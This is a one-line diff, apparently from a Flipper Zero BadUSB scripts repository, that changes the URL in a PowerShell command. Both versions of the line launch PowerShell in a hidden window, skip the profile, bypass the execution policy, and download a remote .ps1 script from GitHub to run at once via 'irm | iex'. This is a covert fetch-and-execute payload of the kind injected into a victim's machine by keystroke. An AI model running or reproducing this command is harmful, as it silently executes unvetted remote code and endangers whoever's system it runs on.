@@ -1,1 +1,1 @@
-powershell -w h -NoP -NonI -Exec Bypass irm https://raw.githubusercontent.com/MattHinz03/Flipper-Scripts/main/tst.ps1 | iex
+powershell -w h -NoP -NonI -Exec Bypass irm https://raw.githubusercontent.com/MattHinz03/Flipper-Scripts/main/Steam-Exit/tst.ps1 | iex
